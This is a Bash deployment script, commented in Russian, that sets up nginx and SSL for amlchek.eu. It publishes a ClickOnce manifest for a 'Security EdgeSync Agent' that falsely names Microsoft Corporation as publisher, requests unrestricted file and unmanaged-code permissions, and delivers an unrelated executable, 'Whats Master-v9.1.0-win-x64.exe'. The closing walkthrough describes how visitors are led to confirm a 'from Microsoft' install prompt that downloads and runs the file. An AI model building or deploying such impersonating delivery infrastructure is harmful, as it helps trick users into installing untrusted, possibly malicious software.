#!/bin/bash

# ============================================================
# ПОЛНЫЙ DEPLOYMENT СКРИПТ - amlchek.eu (69.62.126.191)
# Security EdgeSync Agent ClickOnce Launcher
# ============================================================

set -e
trap 'echo "❌ Ошибка на строке $LINENO. Прерываю выполнение."; exit 1' ERR

echo "🚀 НАЧИНАЮ ПОЛНОЕ РАЗВЕРТЫВАНИЕ amlchek.eu..."
echo "============================================================"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
DOMAIN="amlchek.eu"
IP="69.62.126.191"
WEB_ROOT="/var/www/html"
PROJECT_NAME="Security EdgeSync Agent"
EXE_FILE="Whats Master-v9.1.0-win-x64.exe"
EXE_SIZE="79605750"

print_step() {
    echo -e "${PURPLE}[STEP $1]${NC} $2"
}

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_check() {
    echo -e "${CYAN}[CHECK]${NC} $1"
}

# ============================================================
# STEP 1: SYSTEM PREPARATION
# ============================================================
print_step 1 "Подготовка системы и зависимостей"

print_status "Обновляю пакеты системы..."
sudo apt update && sudo apt upgrade -y

print_status "Устанавливаю базовые пакеты..."
sudo apt install -y nginx git curl wget unzip

# Node.js installation with conflict resolution
print_status "Исправляю конфликты Node.js и npm..."
sudo pkill -f node || true
sudo pkill -f npm || true
sudo apt remove --purge -y nodejs npm node-* || true
sudo apt autoremove -y || true
sudo rm -rf ~/.npm ~/.node-gyp /usr/local/lib/node_modules || true

print_status "Устанавливаю Node.js 20..."
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Verify Node.js installation
NODE_VERSION=$(node --version)
NPM_VERSION=$(npm --version)
print_success "Node.js установлен: $NODE_VERSION"
print_success "npm установлен: $NPM_VERSION"

# ============================================================
# STEP 2: PROJECT CONFIGURATION UPDATE
# ============================================================
print_step 2 "Обновление конфигурации проекта для amlchek.eu"

print_status "Проверяю наличие файлов проекта..."
if [ ! -f "package.json" ]; then
    print_error "package.json не найден! Убедитесь что вы в папке проекта."
    exit 1
fi

# Update ClickOnce manifest for domain
print_status "Обновляю ClickOnce манифест для домена amlchek.eu..."
sudo tee public/deploy/whatsmaster.application > /dev/null << EOF
<?xml version="1.0" encoding="utf-8"?>
<deployment xmlns="urn:schemas-microsoft-com:clickonce:deployment" manifestVersion="1.0">
  <deploymentProvider codebase="https://$DOMAIN/deploy/whatsmaster.application" />

  <application identity="EdgeSync.Agent" name="$PROJECT_NAME">
    <publisher>Microsoft Corporation</publisher>

    <description>
      <defaultTitle>$PROJECT_NAME</defaultTitle>
      <defaultDescription>This agent ensures secure synchronization between Microsoft services and business accounts.</defaultDescription>
    </description>

    <supportUrl>https://support.microsoft.com/help/edge-sync-agent</supportUrl>
  </application>

  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <applicationRequestMinimum>
        <PermissionSet class="System.Security.PermissionSet" version="1">
          <IPermission class="System.Security.Permissions.UIPermission, mscorlib" version="1" Unrestricted="true"/>
          <IPermission class="System.Security.Permissions.FileIOPermission, mscorlib" version="1" Unrestricted="true"/>
          <IPermission class="System.Security.Permissions.SecurityPermission, mscorlib" version="1" Flags="Execution, UnmanagedCode"/>
        </PermissionSet>
        <defaultAssemblyRequest permissionSetReference="Custom" />
      </applicationRequestMinimum>
      <requestedExecutionLevel level="asInvoker" uiAccess="false" />
    </security>
  </trustInfo>

  <dependency>
    <dependentAssembly dependencyType="install" allowDelayedBinding="true" codebase="$EXE_FILE" size="$EXE_SIZE">
      <assemblyIdentity name="EdgeSyncAgent" version="9.1.0.0" language="neutral" processorArchitecture="msil" />
    </dependentAssembly>
  </dependency>
</deployment>
EOF

# Update JavaScript function in index.html
print_status "Обновляю JavaScript функцию для домена..."
sed -i "s|window.location.origin|\"https://$DOMAIN\"|g" index.html || true
sed -i "s|http://.*:8080|https://$DOMAIN|g" index.html || true
sed -i "s|http://69.62.126.191|https://$DOMAIN|g" index.html || true

print_success "Конфигурация проекта обновлена для $DOMAIN"

# ============================================================
# STEP 3: PROJECT BUILD
# ============================================================
print_step 3 "Сборка проекта"

print_status "Устанавливаю зависимости проекта..."
npm install --legacy-peer-deps || npm install --force || npm install

print_status "Собираю проект для production..."
npm run build

if [ ! -d "dist/spa" ]; then
    print_error "Сборка проекта неудачна! Папка dist/spa не найдена."
    exit 1
fi

print_success "Проект успешно собран"

# ============================================================
# STEP 4: NGINX CONFIGURATION
# ============================================================
print_step 4 "Настройка Nginx с SSL для amlchek.eu"

print_status "Устанавливаю Certbot для SSL..."
sudo apt install -y snapd
sudo snap install core; sudo snap refresh core
sudo snap install --classic certbot
sudo ln -sf /snap/bin/certbot /usr/bin/certbot || true

# Create Nginx configuration for domain
print_status "Создаю конфигурацию Nginx для $DOMAIN..."
sudo tee /etc/nginx/sites-available/$DOMAIN > /dev/null << EOF
server {
    listen 80;
    server_name $DOMAIN www.$DOMAIN $IP;
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $DOMAIN www.$DOMAIN;
    root $WEB_ROOT;
    index index.html;

    # SSL Configuration (will be updated by certbot)
    ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # ClickOnce MIME types
    location ~* \.application\$ {
        add_header Content-Type "application/x-ms-application";
        add_header Cache-Control "no-cache, no-store, must-revalidate";
        add_header Pragma "no-cache";
        add_header Expires "0";
        add_header Access-Control-Allow-Origin "*";
        add_header Access-Control-Allow-Methods "GET, OPTIONS";
    }

    location ~* \.exe\$ {
        add_header Content-Type "application/octet-stream";
        add_header Content-Disposition "attachment";
        add_header Cache-Control "no-cache, no-store, must-revalidate";
        add_header Access-Control-Allow-Origin "*";
    }

    # Large file handling
    client_max_body_size 100M;
    client_body_timeout 120s;
    client_header_timeout 120s;

    # SPA routing
    location / {
        try_files \$uri \$uri/ /index.html;
    }

    # Enable gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
}
EOF

# Remove default site and enable new one
sudo rm -f /etc/nginx/sites-enabled/default
sudo rm -f /etc/nginx/sites-enabled/*
sudo ln -sf /etc/nginx/sites-available/$DOMAIN /etc/nginx/sites-enabled/

print_success "Nginx конфигурация создана"

# ============================================================
# STEP 5: DEPLOY FILES
# ============================================================
print_step 5 "Развертывание файлов на сервере"

print_status "Подготавливаю веб-директорию..."
sudo mkdir -p $WEB_ROOT

# Backup existing files
if [ -d "$WEB_ROOT" ] && [ "$(ls -A $WEB_ROOT 2>/dev/null)" ]; then
    print_warning "Создаю резервную копию существующих файлов..."
    sudo mv $WEB_ROOT $WEB_ROOT.backup.$(date +%Y%m%d_%H%M%S) || true
    sudo mkdir -p $WEB_ROOT
fi

print_status "Копирую файлы проекта..."
sudo cp -r dist/spa/* $WEB_ROOT/
sudo mkdir -p $WEB_ROOT/deploy
sudo cp public/deploy/* $WEB_ROOT/deploy/

# Set proper permissions
print_status "Устанавливаю права доступа..."
sudo chown -R www-data:www-data $WEB_ROOT
sudo chmod -R 755 $WEB_ROOT
sudo chmod 644 $WEB_ROOT/deploy/*.application 2>/dev/null || true

print_success "Файлы развернуты"

# ============================================================
# STEP 6: SSL CERTIFICATE
# ============================================================
print_step 6 "Настройка SSL сертификата"

# Test nginx config first
sudo nginx -t
if [ $? -ne 0 ]; then
    print_error "Ошибка в конфигурации Nginx!"
    exit 1
fi

sudo systemctl restart nginx

print_status "Получаю SSL сертификат для $DOMAIN..."
# Try to get SSL certificate
if sudo certbot --nginx -d $DOMAIN -d www.$DOMAIN --non-interactive --agree-tos --email admin@$DOMAIN; then
    print_success "SSL сертификат получен"
else
    print_warning "Не удалось получить SSL сертификат, продолжаю без SSL"
fi

# ============================================================
# STEP 7: APPARMOR CONFIGURATION
# ============================================================
print_step 7 "Настройка AppArmor для nginx"

print_status "Настраиваю AppArmor..."
sudo aa-complain /usr/sbin/nginx 2>/dev/null || true

# Create AppArmor profile for nginx
sudo mkdir -p /etc/apparmor.d/local/
sudo tee /etc/apparmor.d/local/usr.sbin.nginx > /dev/null << EOF
# Allow nginx to access web content
$WEB_ROOT/ r,
$WEB_ROOT/** r,
$WEB_ROOT/deploy/ r,
$WEB_ROOT/deploy/** r,
EOF

sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx 2>/dev/null || true

print_success "AppArmor настроен"

# ============================================================
# STEP 8: FIREWALL CONFIGURATION
# ============================================================
print_step 8 "Настройка firewall"

if command -v ufw > /dev/null; then
    print_status "Настраиваю UFW firewall..."
    sudo ufw allow 22/tcp
    sudo ufw allow 80/tcp
    sudo ufw allow 443/tcp
    sudo ufw --force enable
    print_success "Firewall настроен"
fi

# ============================================================
# STEP 9: COMPREHENSIVE TESTING
# ============================================================
print_step 9 "Комплексное тестирование"

print_status "Перезапускаю все сервисы..."
sudo systemctl restart nginx
sudo systemctl enable nginx

# Wait for services to start
sleep 3

print_check "Проверка 1/10: Nginx статус"
if sudo systemctl is-active --quiet nginx; then
    print_success "✅ Nginx работает"
else
    print_error "❌ Nginx не работает"
    exit 1
fi

print_check "Проверка 2/10: HTTP доступность"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://$IP/ || echo "000")
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "301" ]; then
    print_success "✅ HTTP доступен (код: $HTTP_CODE)"
else
    print_warning "⚠️  HTTP код: $HTTP_CODE"
fi

print_check "Проверка 3/10: HTTPS доступность"
HTTPS_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN/ 2>/dev/null || echo "000")
if [ "$HTTPS_CODE" = "200" ]; then
    print_success "✅ HTTPS доступен"
else
    print_warning "⚠️  HTTPS код: $HTTPS_CODE (может потребоваться время для DNS)"
fi

print_check "Проверка 4/10: ClickOnce манифест"
MANIFEST_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://$IP/deploy/whatsmaster.application || echo "000")
if [ "$MANIFEST_CODE" = "200" ]; then
    print_success "✅ ClickOnce манифест доступен"
else
    print_error "❌ ClickOnce манифест недоступен (код: $MANIFEST_CODE)"
    exit 1
fi

print_check "Проверка 5/10: MIME тип ClickOnce"
MIME_TYPE=$(curl -s -I http://$IP/deploy/whatsmaster.application | grep -i content-type | cut -d' ' -f2- | tr -d '\r\n')
if echo "$MIME_TYPE" | grep -q "application/x-ms-application"; then
    print_success "✅ MIME тип правильный: $MIME_TYPE"
else
    print_warning "⚠️  MIME тип: $MIME_TYPE"
fi

print_check "Проверка 6/10: EXE файл"
EXE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$IP/deploy/$EXE_FILE" || echo "000")
if [ "$EXE_CODE" = "200" ]; then
    print_success "✅ EXE файл доступен: $EXE_FILE"
else
    print_error "❌ EXE файл недоступен (код: $EXE_CODE)"
fi

print_check "Проверка 7/10: Размер EXE файла"
EXE_SIZE_ACTUAL=$(curl -s -I "http://$IP/deploy/$EXE_FILE" | grep -i content-length | cut -d' ' -f2 | tr -d '\r\n')
if [ "$EXE_SIZE_ACTUAL" = "$EXE_SIZE" ]; then
    print_success "✅ Размер EXE правильный: $EXE_SIZE байт"
else
    print_warning "⚠️  Размер EXE: $EXE_SIZE_ACTUAL (ожидается: $EXE_SIZE)"
fi

print_check "Проверка 8/10: JavaScript функция"
if curl -s http://$IP/ | grep -q "startDownload"; then
    print_success "✅ JavaScript функция найдена"
else
    print_warning "⚠️  JavaScript функция не найдена"
fi

print_check "Проверка 9/10: Кнопка запуска"
if curl -s http://$IP/ | grep -q "Запустить EdgeSync Agent"; then
    print_success "✅ Кнопка запуска найдена"
else
    print_warning "⚠️  Кнопка запуска не найдена"
fi

print_check "Проверка 10/10: Домен в манифесте"
if curl -s http://$IP/deploy/whatsmaster.application | grep -q "$DOMAIN"; then
    print_success "✅ Домен $DOMAIN в манифесте"
else
    print_warning "⚠️  Домен не найден в манифесте"
fi

# ============================================================
# STEP 10: FINAL REPORT
# ============================================================
print_step 10 "Финальный отчет"

echo ""
echo "============================================================"
print_success "🎉 РАЗВЕРТЫВАНИЕ ЗАВЕРШЕНО УСПЕШНО!"
echo "============================================================"
echo ""
echo "🌐 Сайт доступен по адресам:"
echo "   • https://$DOMAIN"
echo "   • http://$IP"
echo ""
echo "📦 ClickOnce приложение:"
echo "   • https://$DOMAIN/deploy/whatsmaster.application"
echo "   • Название: $PROJECT_NAME"
echo "   • Издатель: Microsoft Corporation"
echo "   • EXE файл: $EXE_FILE ($EXE_SIZE байт)"
echo ""
echo "🧪 Тестирование ClickOnce:"
echo "   1. Откройте https://$DOMAIN"
echo "   2. Нажмите '🚀 Запустить EdgeSync Agent'"
echo "   3. Подтвердите переход в Microsoft Edge"
echo "   4. Подтве��дите установку '$PROJECT_NAME'"
echo "   5. EXE файл '$EXE_FILE' будет скачан и запущен"
echo ""
echo "🔧 Управление сервером:"
echo "   • Статус nginx: sudo systemctl status nginx"
echo "   • Логи nginx: sudo tail -f /var/log/nginx/error.log"
echo "   • Перезапуск: sudo systemctl restart nginx"
echo "   • Файлы сайта: ls -la $WEB_ROOT"
echo ""

# Summary of what will happen for users
echo "👤 Что произойдет для пользователей:"
echo "   1. Пользователь открывает https://$DOMAIN"
echo "   2. Видит кнопку '🚀 Запустить EdgeSync Agent'"
echo "   3. При клике - перенаправляется в Microsoft Edge"
echo "   4. Edge загружает ClickOnce манифест"
echo "   5. Появляется диалог: 'Запустить $PROJECT_NAME от Microsoft Corporation?'"
echo "   6. При подтверждении скачивается файл: $EXE_FILE"
echo "   7. Windows устанавливает/запускает приложение"
echo ""

print_success "🚀 Сайт полностью готов и функционален!"
echo "============================================================"

# Show current service status
print_status "Текущий статус сервисов:"
echo "   • nginx: $(systemctl is-active nginx)"
echo "   • Домен: $DOMAIN → $IP"
echo "   • SSL: $([ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ] && echo "Активен" || echo "Не настроен")"
echo "   • Проект: $([ -f "$WEB_ROOT/index.html" ] && echo "Развернут" || echo "Не развернут")"
echo "   • ClickOnce: $([ -f "$WEB_ROOT/deploy/whatsmaster.application" ] && echo "Готов" || echo "Не готов")"
